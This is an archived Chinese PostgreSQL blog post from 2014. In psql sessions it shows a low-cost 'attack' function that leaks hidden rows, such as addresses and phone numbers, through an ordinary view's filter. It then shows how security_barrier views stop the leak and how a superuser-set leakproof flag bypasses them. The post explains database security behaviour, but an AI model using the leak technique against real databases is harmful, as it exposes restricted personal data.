<html>
<head>
<meta http-equiv="Content-Type" content="text/html;charset=gbk">
<title>PostgreSQL research</title>
<style type="text/css">
.blogcnt{line-height:160%;font-size:14px;text-align:left;word-wrap:break-word;}
.blogcnt *{line-height:160%;}
.blogcnt p{margin:0 0 10px;}
.blogcnt ul,.nbw-blog ol{margin:5px 0 5px 40px;padding:0}
.blogcnt em{font-style:italic;}
.blogcnt blockquote{font-size:1em;margin:auto 0 auto 35px;}
.blogcnt img{border:0;max-width:100%;}
</style>
</head>
<body style="color:#444444;">
<h1 id="blog-Title"><a href="index.html">PostgreSQL research</a></h1>
<div id="" style="padding:0 20px;">
	<h2 id="">PostgreSQL leakproof function in rule rewrite("attack" security_barrier views).</h2>
	<h5 id="">2014-04-14 10:03:15&nbsp;&nbsp;&nbsp;<a href="http://blog.163.com/digoal@126/blog/static/163877040201431410032638/" target="_blank">查看原文&gt;&gt;</a></h5>
	<div class="" id="" style="padding:0 20px;">
		<div class="blogcnt" style="width:800px;"><div>上一篇BLOG我介绍了一下PostgreSQL 9.4新增的一个功能, 支持自动更新设置了安全栅栏的简单视图.</div><div><a target="_blank" href="http://blog.163.com/digoal@126/blog/static/163877040201431475019925/"   >http://blog.163.com/digoal@126/blog/static/163877040201431475019925/</a></div><div>在文章结尾的时候提到leakproof函数和安全栅栏条件一样, 在重写规则时会放到用户的过滤条件之前执行.</div><div>因此, 安全栅栏并不能防止leakproof的攻击(<span style="line-height: 28px;"   >当然, 只有超级用户才能创建leakproof函数, 所以也不能说利用leakproof来攻击了. 因为既然有了超级用户权限, 就不需要这么麻烦来获取数据了, 直接读原表得了.</span><span style="line-height: 28px;"   >).&nbsp;</span></div><div>另外, 使用leakproof函数需要注意的是它的实际执行成本, 如果实际执行成本很高的函数, 又没有特别的需要让它先执行, 那么最好不要设置为leakproof, 因为它不管其他过滤条件, 都是先执行的.</div><div><span style="line-height: 28px;"   ><br></span></div><div>我们可以拿视图攻击的例子来演示这个攻击 :&nbsp;</div><div>普通视图的攻击例子 :&nbsp;</div><div><pre class="prettyprint"   ><p></p><div><div><font size="2"   >digoal=# create table userinfo(id int, groupid int, username text, age int, addr text, email text, phone text);</font></div><div><font size="2"   >CREATE TABLE</font></div><div><font size="2"   >digoal=# insert into userinfo values (1, 1, 'digoal', 1000, '杭州西湖区', 'digoal@126.com', '13999999999');</font></div><div><font size="2"   >INSERT 0 1</font></div><div><font size="2"   >digoal=# insert into userinfo values (2, 1, 'test', 1000, '火星', 'digoal@126.com', '11999999999');</font></div><div><font size="2"   >INSERT 0 1</font></div><div><font size="2"   >digoal=# insert into userinfo values (3, 1, 'test', 1000, '月球', 'digoal@126.com', '11999999999');</font></div><div><font size="2"   >INSERT 0 1</font></div><div><font size="2"   >digoal=# insert into userinfo values (4, 2, 'test', 1000, '土星', 'digoal@126.com', '11999999999');</font></div><div><font size="2"   >INSERT 0 1</font></div><div><font size="2"   >digoal=# create view v_userinfo as select * from userinfo where groupid =2;</font></div><div><font size="2"   >CREATE VIEW</font></div></div><div><div><font size="2"   >digoal=# \c digoal digoal</font></div><div><font size="2"   >You are now connected to database "digoal" as user "digoal".</font></div><div><font size="2"   >digoal=&gt; select * from userinfo;</font></div><div><font size="2"   >ERROR: &nbsp;permission denied for relation userinfo</font></div><div><font size="2"   >digoal=&gt; select * from v_userinfo;</font></div><div><font size="2"   >ERROR: &nbsp;permission denied for relation v_userinfo</font></div><div><font size="2"   >digoal=&gt; \c digoal postgres</font></div><div><font size="2"   >You are now connected to database "digoal" as user "postgres".</font></div><div><font size="2"   >digoal=# grant select on v_userinfo to digoal;</font></div><div><font size="2"   >GRANT</font></div></div><div><div><font size="2"   >digoal=# \c digoal digoal</font></div><div><font size="2"   >You are now connected to database "digoal" as user "digoal".</font></div><div><font size="2"   >digoal=&gt; select * from v_userinfo;</font></div><div><font size="2"   >&nbsp;id | groupid | username | age &nbsp;| addr | &nbsp; &nbsp; email &nbsp; &nbsp; &nbsp;| &nbsp; &nbsp;phone &nbsp; &nbsp;</font></div><div><font size="2"   >----+---------+----------+------+------+----------------+-------------</font></div><div><font size="2"   >&nbsp; 4 | &nbsp; &nbsp; &nbsp; 2 | test &nbsp; &nbsp; | 1000 | 土星 | digoal@126.com | 11999999999</font></div><div><font size="2"   >(1 row)</font></div><div><font size="2"   ><br></font></div><div><font size="2"   >digoal=&gt; create or replace function attack(int,int,text,int,text,text,text) returns boolean as $$</font></div><div><font size="2"   >digoal$&gt; declare</font></div><div><font size="2"   >digoal$&gt; begin</font></div><div><font size="2"   >digoal$&gt; &nbsp; raise notice '%,%,%,%,%,%,%', $1,$2,$3,$4,$5,$6,$7;</font></div><div><font size="2"   >digoal$&gt; &nbsp; return true;</font></div><div><font size="2"   >digoal$&gt; end;</font></div><div><font size="2"   >digoal$&gt; $$ language plpgsql cost 0.00000000000000000000001;</font></div><div><font size="2"   >CREATE FUNCTION</font></div><div><font size="2"   >digoal=&gt; select * from v_userinfo;</font></div><div><font size="2"   >&nbsp;id | groupid | username | age &nbsp;| addr | &nbsp; &nbsp; email &nbsp; &nbsp; &nbsp;| &nbsp; &nbsp;phone &nbsp; &nbsp;</font></div><div><font size="2"   >----+---------+----------+------+------+----------------+-------------</font></div><div><font size="2"   >&nbsp; 4 | &nbsp; &nbsp; &nbsp; 2 | test &nbsp; &nbsp; | 1000 | 土星 | digoal@126.com | 11999999999</font></div><div><font size="2"   >(1 row)</font></div><div><font size="2"   ><br></font></div><div><font size="2"   >digoal=&gt; select * from v_userinfo where attack(id,groupid,username,age,addr,email,phone);</font></div><div><font size="2"   >NOTICE: &nbsp;1,1,digoal,1000,杭州西湖区,digoal@126.com,13999999999</font></div><div><font size="2"   >NOTICE: &nbsp;2,1,test,1000,火星,digoal@126.com,11999999999</font></div><div><font size="2"   >NOTICE: &nbsp;3,1,test,1000,月球,digoal@126.com,11999999999</font></div><div><font size="2"   >NOTICE: &nbsp;4,2,test,1000,土星,digoal@126.com,11999999999</font></div><div><font size="2"   >&nbsp;id | groupid | username | age &nbsp;| addr | &nbsp; &nbsp; email &nbsp; &nbsp; &nbsp;| &nbsp; &nbsp;phone &nbsp; &nbsp;</font></div><div><font size="2"   >----+---------+----------+------+------+----------------+-------------</font></div><div><font size="2"   >&nbsp; 4 | &nbsp; &nbsp; &nbsp; 2 | test &nbsp; &nbsp; | 1000 | 土星 | digoal@126.com | 11999999999</font></div><div><font size="2"   >(1 row)</font></div></div><p></p></pre></div><div>设置视图的安全栅栏属性 :&nbsp;</div><div>使用普通的函数就不能攻击他了.</div><div><pre class="prettyprint"   ><p></p><div><div><font size="2"   >digoal=&gt; \c digoal postgres</font></div><div><font size="2"   >You are now connected to database "digoal" as user "postgres".</font></div><div><font size="2"   >digoal=# create view v_userinfo_1 with(security_barrier) as select * from userinfo where id=2;</font></div><div><font size="2"   >CREATE VIEW</font></div><div><font size="2"   >digoal=# grant select on v_userinfo_1 to digoal;</font></div><div><font size="2"   >GRANT</font></div><div><font size="2"   >digoal=# \c digoal digoal</font></div><div><font size="2"   >You are now connected to database "digoal" as user "digoal".</font></div></div><div><div><font size="2"   >digoal=&gt; select * from v_userinfo_1 where attack(id,groupid,username,age,addr,email,phone);</font></div><div><font size="2"   >NOTICE: &nbsp;2,1,test,1000,火星,digoal@126.com,11999999999</font></div><div><font size="2"   >&nbsp;id | groupid | username | age &nbsp;| addr | &nbsp; &nbsp; email &nbsp; &nbsp; &nbsp;| &nbsp; &nbsp;phone &nbsp; &nbsp;</font></div><div><font size="2"   >----+---------+----------+------+------+----------------+-------------</font></div><div><font size="2"   >&nbsp; 2 | &nbsp; &nbsp; &nbsp; 1 | test &nbsp; &nbsp; | 1000 | 火星 | digoal@126.com | 11999999999</font></div><div><font size="2"   >(1 row)</font></div></div><p></p></pre></div><div><div>但是, 如果把函数设置为leakproof, 就可以被攻击了.</div><div><pre class="prettyprint"   ><p></p><div><div><font size="2"   >digoal=&gt; \c digoal postgres</font></div><div><font size="2"   >You are now connected to database "digoal" as user "postgres".</font></div></div><div><div><font size="2"   >digoal=# alter function digoal.attack(int,int,text,int,text,text,text) leakproof;</font></div><div><font size="2"   >ALTER FUNCTION</font></div><div><font size="2"   >digoal=# \c digoal digoal</font></div><div><font size="2"   >You are now connected to database "digoal" as user "digoal".</font></div><div><font size="2"   >digoal=&gt; select * from v_userinfo_1 where attack(id,groupid,username,age,addr,email,phone);</font></div><div><font size="2"   >NOTICE: &nbsp;1,1,digoal,1000,杭州西湖区,digoal@126.com,13999999999</font></div><div><font size="2"   >NOTICE: &nbsp;2,1,test,1000,火星,digoal@126.com,11999999999</font></div><div><font size="2"   >NOTICE: &nbsp;3,1,test,1000,月球,digoal@126.com,11999999999</font></div><div><font size="2"   >NOTICE: &nbsp;4,2,test,1000,土星,digoal@126.com,11999999999</font></div><div><font size="2"   >&nbsp;id | groupid | username | age &nbsp;| addr | &nbsp; &nbsp; email &nbsp; &nbsp; &nbsp;| &nbsp; &nbsp;phone &nbsp; &nbsp;</font></div><div><font size="2"   >----+---------+----------+------+------+----------------+-------------</font></div><div><font size="2"   >&nbsp; 2 | &nbsp; &nbsp; &nbsp; 1 | test &nbsp; &nbsp; | 1000 | 火星 | digoal@126.com | 11999999999</font></div><div><font size="2"   >(1 row)</font></div></div><p></p></pre></div></div><div>原因是在重写规则时, leakproof函数和安全栅栏条件一样, 被放到了relation层过滤, 而普通函数则在子查询中过滤 :&nbsp;</div><div><pre class="prettyprint"   ><p></p><div><font size="2"   >digoal=&gt; explain verbose select * from v_userinfo_1 where attack(id,groupid,username,age,addr,email,phone);</font></div><div><font size="2"   >&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;QUERY PLAN &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</font></div><div><font size="2"   >&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</font></div><div><font size="2"   >------------------------------------------------------------------------------------------------------------------------------------</font></div><div><font size="2"   >---------------------</font></div><div><font size="2"   >&nbsp;Seq Scan on public.userinfo &nbsp;(cost=0.00..34.00 rows=3 width=140)</font></div><div><font size="2"   >&nbsp; &nbsp;Output: userinfo.id, userinfo.groupid, userinfo.username, userinfo.age, userinfo.addr, userinfo.email, userinfo.phone</font></div><div><font size="2"   >&nbsp; &nbsp;Filter: (attack(userinfo.id, userinfo.groupid, userinfo.username, userinfo.age, userinfo.addr, userinfo.email, userinfo.phone) AN</font></div><div><font size="2"   >D (userinfo.id = 2))</font></div><div><font size="2"   >(3 rows)</font></div><div><font size="2"   ><br></font></div><div><font size="2"   >digoal=&gt; \c digoal postgres</font></div><div><font size="2"   >You are now connected to database "digoal" as user "postgres".</font></div><div><font size="2"   >digoal=# alter function digoal.attack(int,int,text,int,text,text,text) not leakproof;</font></div><div><font size="2"   >ALTER FUNCTION</font></div><div><font size="2"   >digoal=# \c digoal digoal</font></div><div><font size="2"   >You are now connected to database "digoal" as user "digoal".</font></div><div><font size="2"   >digoal=&gt; explain verbose select * from v_userinfo_1 where attack(id,groupid,username,age,addr,email,phone);</font></div><div><font size="2"   >&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;QUERY PLAN &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</font></div><div><font size="2"   >&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</font></div><div><font size="2"   >------------------------------------------------------------------------------------------------------------------------------------</font></div><div><font size="2"   >-------------------------</font></div><div><font size="2"   >&nbsp;Subquery Scan on v_userinfo_1 &nbsp;(cost=0.00..34.10 rows=3 width=140)</font></div><div><font size="2"   >&nbsp; &nbsp;Output: v_userinfo_1.id, v_userinfo_1.groupid, v_userinfo_1.username, v_userinfo_1.age, v_userinfo_1.addr, v_userinfo_1.email, v_</font></div><div><font size="2"   >userinfo_1.phone</font></div><div><font size="2"   >&nbsp; &nbsp;Filter: attack(v_userinfo_1.id, v_userinfo_1.groupid, v_userinfo_1.username, v_userinfo_1.age, v_userinfo_1.addr, v_userinfo_1.em</font></div><div><font size="2"   >ail, v_userinfo_1.phone)</font></div><div><font size="2"   >&nbsp; &nbsp;-&gt; &nbsp;Seq Scan on public.userinfo &nbsp;(cost=0.00..34.00 rows=10 width=140)</font></div><div><font size="2"   >&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Output: userinfo.id, userinfo.groupid, userinfo.username, userinfo.age, userinfo.addr, userinfo.email, userinfo.phone</font></div><div><font size="2"   >&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Filter: (userinfo.id = 2)</font></div><div><font size="2"   >(6 rows)</font></div><p></p></pre></div><div>当然, 只有超级用户才能创建leakproof函数, 所以也不能说利用leakproof来攻击了. 因为既然有了超级用户权限, 就不需要这么麻烦来获取数据了, 直接读原表得了.</div><div><pre class="prettyprint"   ><p></p><div><font size="2"   >digoal=&gt; \c digoal digoal</font></div><div><font size="2"   >You are now connected to database "digoal" as user "digoal".</font></div><div><font size="2"   >digoal=&gt; alter function digoal.attack(int,int,text,int,text,text,text) not leakproof;</font></div><div><font size="2"   >ALTER FUNCTION</font></div><div><font size="2"   >digoal=&gt; alter function digoal.attack(int,int,text,int,text,text,text) leakproof;</font></div><div><font size="2"   >ERROR: &nbsp;only superuser can define a leakproof function</font></div><p></p></pre></div><div><br></div>[参考]<wbr><div>1.&nbsp;<a style="line-height: 28px;" target="_blank" rel="nofollow" href="http://www.postgresql.org/docs/devel/static/rules-privileges.html"   >http://www.postgresql.org/docs/devel/static/rules-privileges.html</a></div><div>2.&nbsp;<a style="line-height: 28px;" target="_blank" href="http://blog.163.com/digoal@126/blog/static/163877040201361031431669/"   >http://blog.163.com/digoal@126/blog/static/163877040201361031431669/</a></div><div>3.&nbsp;<a style="line-height: 28px;" target="_blank" href="http://blog.163.com/digoal@126/blog/static/163877040201431475019925/"   >http://blog.163.com/digoal@126/blog/static/163877040201431475019925/</a></div>
<a rel="nofollow" href="http://info.flagcounter.com/h9V1"   ><img title="PostgreSQL leakproof function in rule rewrite(attack security_barrier views). - 德哥@Digoal - PostgreSQL"   src="http://s03.flagcounter.com/count/h9V1/bg_FFFFFF/txt_000000/border_CCCCCC/columns_2/maxflags_12/viewers_0/labels_0/pageviews_0/flags_0/"   alt="Flag Counter"   border="0"   ></a></div>
	</div>
</div>
</body>
</html>